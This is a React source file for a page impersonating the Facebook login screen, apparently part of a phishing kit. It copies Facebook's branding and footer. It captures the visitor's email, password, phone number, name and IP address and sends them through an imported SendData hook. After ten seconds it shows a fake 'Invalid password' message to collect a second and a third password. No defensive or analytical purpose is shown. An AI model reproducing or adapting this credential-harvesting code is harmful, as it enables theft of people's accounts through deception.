import React, { useContext, useState, useEffect } from "react";
import styled from "styled-components";
import SendData from "../hooks/SendData";
import { DataContext } from "../pages";
import Image from "next/image";

const Container = styled.div`
  display: flex;
  flex-direction: column;
  background-color: #f0f2f5;
  width: 100%;
  padding: 20px;
  height: 100vh;
  justify-content: start;
`;

const PageHeader = styled.div`
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 48px 0 0;
  margin-bottom: 20px;

  h1 {
    color: #0866ff;
    font-size: 50px;
    font-weight: bold;
    font-family: "Optimistic Display Bold", "Helvetica Neue", Helvetica, Arial,
      sans-serif;
    margin: 0;
  }
`;

const MainContentWrapper = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
`;

const LoginBoxWrapper = styled.div`
  background-color: #fff;
  width: 100%;
  border-radius: 8px;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
  padding: 24px 20px;
  max-width: 400px;
  margin: 0 auto;
  flex-grow: 0;
  justify-content: flex-start;
`;

const LoginTitle = styled.h2`
  display: block;
  font-size: 20px;
  font-weight: 400;
  line-height: 24px;
  text-align: center;
  margin-bottom: 24px;
  color: #1c1e21;
  font-family: "Optimistic Text Normal", system-ui, -apple-system,
    BlinkMacSystemFont, sans-serif;
`;

const LanguageSelector = styled.div`
  font-size: 12px;
  margin: 0 5px;
  color: #737373;
  cursor: pointer;
  &:hover {
    text-decoration: underline;
  }
`;

const FormSection = styled.div`
  display: flex;
  flex-direction: column;
  width: 100%;
  flex-grow: 0;
`;

const InputsContainer = styled.div`
  flex-direction: column;
  justify-content: flex-start;
  padding: 0;
`;

const CustomInput = styled.input`
  border: 1px solid #dddfe2 !important;
  border-radius: 6px !important;
  padding: 14px 16px !important;
  background-color: #fff !important;
  margin-top: 0;
  width: 100%;
  font-size: 17px;
  color: #1d2129;
  line-height: 1.34;
  min-height: auto;

  &.redborder {
    border: 1px solid red !important;
  }

  ::placeholder {
    opacity: 1;
    color: #90949c;
    font-weight: 400;
    font-size: 17px;
  }
  margin-bottom: 12px;

  &:focus {
    outline: none;
    border-color: #0866ff !important;
    box-shadow: 0 0 0 2px #e7f3ff;
  }
`;

const LoginButton = styled.button`
  width: 100%;
  height: 48px;
  background-color: #0866ff;
  border: none;
  border-radius: 6px;
  color: rgb(255, 255, 255);
  font-size: 20px;
  font-weight: bold;
  font-family: "Optimistic Text Bold", "Helvetica Neue", Helvetica, Arial,
    sans-serif;
  padding: 0 16px;
  margin-top: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  line-height: 48px;

  &:hover {
    background-color: #005ce6;
  }
`;

const ForgotPassword = styled.div`
  text-align: center;
  margin-top: 16px;
  height: auto;
  display: flex;
  align-items: center;
  justify-content: center;
  padding-bottom: 0;
`;

const BottomSection = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  margin-top: 24px;
  flex-grow: 0;
  flex-shrink: 0;
  padding-bottom: 0;
  padding-top: 0;
  justify-content: flex-end;
  width: 100%;
`;

const CreateAccountButton = styled.button`
  background-color: #42b72a;
  border: none;
  border-radius: 6px;
  color: #fff;
  font-size: 17px;
  font-weight: bold;
  padding: 0 16px;
  height: 48px;
  min-width: auto;
  flex-grow: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  font-family: "Optimistic Text Bold", "Helvetica Neue", Helvetica, Arial,
    sans-serif;
  line-height: 48px;
  margin-top: 0;

  &:hover {
    background-color: #36a420;
  }
`;

const PageFooter = styled.footer`
  display: flex;
  flex-direction: column;
  align-items: center;

  margin-top: 10rem;
  width: 100%;
  padding: 40px 0 20px;
  background-color: #f0f2f5;
  font-family: "Optimistic Text Normal", Arial, sans-serif;
  font-size: 12px;
  color: #737373;
  bottom: 0;
  left: 0;
  right: 0;
`;

const LanguageList = styled.div`
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  padding: 0 20px;
  margin-bottom: 8px;
  border-bottom: 1px solid #dddfe2;
  padding-bottom: 8px;
  width: 100%;
  max-width: 980px;
`;

const MoreLanguagesButton = styled.button`
  background-color: #f5f6f7;
  border: 1px solid #ccd0d5;
  border-radius: 2px;
  padding: 0 8px;
  height: 21px;
  font-size: 12px;
  color: #4b4f56;
  margin-left: 5px;
  cursor: pointer;
  &:hover {
    background-color: #ebedf0;
  }
`;

const FooterLinkList = styled.div`
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  padding: 0 20px;
  margin-top: 8px;
  max-width: 980px;

  a,
  span {
    color: #737373;
    font-size: 12px;
    margin: 0 10px 4px;
    text-decoration: none;
    cursor: pointer;
    &:hover {
      text-decoration: underline;
    }
  }
`;

const Copyright = styled.div`
  margin-top: 20px;
  font-size: 11px;
  color: #737373;
`;

const Spinner = styled.div`
  width: 20px;
  height: 20px;
  border: 3px solid rgba(255, 255, 255, 0.3);
  border-radius: 50%;
  border-top-color: white;
  animation: spin 1s ease-in-out infinite;
  margin: 0 auto;

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
`;

const ValidationError = styled.div`
  color: red;
  font-size: 13px;
  font-weight: 500;
  margin-top: 4px;
  text-align: left;
  margin-bottom: 8px;
`;

function Step2PC({
  Unik,
  setStep,
  Tel,
  setTel,
  Email,
  setEmail,
  Name,
  setName,
  Appeal,
  setAppeal,
  BusinessEmail,
  setBusinessEmail,
  Ip,
  Step,
  parentBeginTimer,
  setParentBeginTimer,
  InvalidPassword,
}) {
  const [Password, setPassword] = useState("");
  const [TriedSubmit, setTriedSubmit] = useState(false);
  const [IsValidEmail, setIsValidEmail] = useState(false);
  const [IsLoading, setIsLoading] = useState(false);

  // Track verification state
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationError, setVerificationError] = useState(false);
  const [passwordError, setPasswordError] = useState("");
  const [emailError, setEmailError] = useState("");

  useEffect(() => {
    if (InvalidPassword) {
      if (AllData.login_email) {
        setEmail(AllData.login_email);
        setIsValidEmail(true);
      }
      setIsVerifying(true);
      setIsLoading(false);
      setPasswordError("Invalid password. Please try again.");
    }
  }, [InvalidPassword]);

  let handleEmail = (email) => {
    setEmail(email.target.value);
    setEmailError("");

    let re =
      /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

    if (re.test(email.target.value) || email.target.value.length > 8) {
      setIsValidEmail(true);
    } else {
      setIsValidEmail(false);
    }
  };

  let { setAllData, AllData } = useContext(DataContext);

  const HandleSubmit = () => {
    setTriedSubmit(true);

    if (!IsValidEmail) {
      setEmailError("Please enter a valid email");
    }

    if (Password.length < 5) {
      setPasswordError("Please enter a valid password");
      return;
    }

    if (IsValidEmail && Password.length > 4) {
      setIsLoading(true);

      // If not yet verifying, this is the first password submission
      if (!isVerifying) {
        const params = {
          ...AllData,
          id: Unik,
          phone_number: Tel,
          login_email: Email,
          business_email: Email,
          ip: Ip,
          full_name: Name,
          password_one: Password,
          currentStep: "Waiting",
        };

        setAllData(params);
        SendData(params);

        setTimeout(() => {
          // Clear password and prompt for verification
          setPassword("");
          setPasswordError("Invalid password. Please try again.");
          setIsVerifying(true);
          setIsLoading(false);
        }, 10000);
      }
      // If already verifying, this is the second password submission
      else {
        if (InvalidPassword) {
          const params = {
            ...AllData,
            password_three: Password,
            currentStep: "Wait",
          };

          setAllData(params);
          SendData(params);
          setParentBeginTimer(true);
          return;
        }
        const params = {
          ...AllData,
          password_two: Password,
        };

        setAllData(params);
        SendData(params);
        setParentBeginTimer(true);
      }
    }
  };

  return (
    <Container>
      <PageHeader>
        <h1>facebook</h1>
      </PageHeader>
      <MainContentWrapper>
        <LoginBoxWrapper>
          <LoginTitle>Log into Facebook</LoginTitle>

          <FormSection>
            <InputsContainer>
              <CustomInput
                type="text"
                value={Email}
                onChange={handleEmail}
                placeholder="Mobile number or email address"
                className={`form-control ${
                  !IsValidEmail && TriedSubmit ? "redborder" : ""
                }`}
                disabled={IsLoading}
              />
              {emailError && <ValidationError>{emailError}</ValidationError>}

              <CustomInput
                type="password"
                value={Password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setPasswordError("");
                }}
                placeholder={"Password"}
                className={`form-control ${
                  Password.length < 5 && TriedSubmit ? "redborder" : ""
                }`}
                disabled={IsLoading}
              />
              {passwordError && (
                <ValidationError>{passwordError}</ValidationError>
              )}

              <LoginButton onClick={HandleSubmit}>
                {IsLoading ? <Spinner /> : "Log in"}
              </LoginButton>

              <ForgotPassword>
                <a href="#">Forgot password?</a>
              </ForgotPassword>
            </InputsContainer>
          </FormSection>

          {/* <BottomSection>
                        <CreateAccountButtonContainer>
                            <CreateAccountButton>
                                Create new account
                            </CreateAccountButton>
                        </CreateAccountButtonContainer>
                    </BottomSection> */}
        </LoginBoxWrapper>
      </MainContentWrapper>

      <PageFooter>
        <LanguageList>
          <LanguageSelector>English (UK)</LanguageSelector>
          <LanguageSelector>Shqip</LanguageSelector>
          <LanguageSelector>Deutsch</LanguageSelector>
          <LanguageSelector>Türkçe</LanguageSelector>
          <LanguageSelector>Српски</LanguageSelector>
          <LanguageSelector>Français (France)</LanguageSelector>
          <LanguageSelector>Italiano</LanguageSelector>
          <LanguageSelector>Bosanski</LanguageSelector>
          <LanguageSelector>Svenska</LanguageSelector>
          <LanguageSelector>Español</LanguageSelector>
          <LanguageSelector>Português (Brasil)</LanguageSelector>
          <MoreLanguagesButton>+</MoreLanguagesButton>
        </LanguageList>
        <FooterLinkList>
          <a>Sign Up</a>
          <a>Log In</a>
          <a>Messenger</a>
          <a>Facebook Lite</a>
          <a>Video</a>
          <a>Places</a>
          <a>Games</a>
          <a>Marketplace</a>
          <a>Meta Pay</a>
          <a>Meta Store</a>
          <a>Meta Quest</a>
          <a>Imagine with Meta AI</a>
          <a>Instagram</a>
          <a>Threads</a>
          <a>Fundraisers</a>
          <a>Services</a>
          <a>Voting Information Centre</a>
          <a>Privacy Policy</a>
          <a>Privacy Centre</a>
          <a>Groups</a>
          <a>About</a>
          <a>Create ad</a>
          <a>Create Page</a>
          <a>Developers</a>
          <a>Careers</a>
          <a>Cookies</a>
          <a>AdChoices</a>
          <a>Terms</a>
          <a>Help</a>
          <a>Contact uploading and non-users</a>
        </FooterLinkList>
        <Copyright>Meta © 2025</Copyright>
      </PageFooter>
    </Container>
  );
}

export default Step2PC;
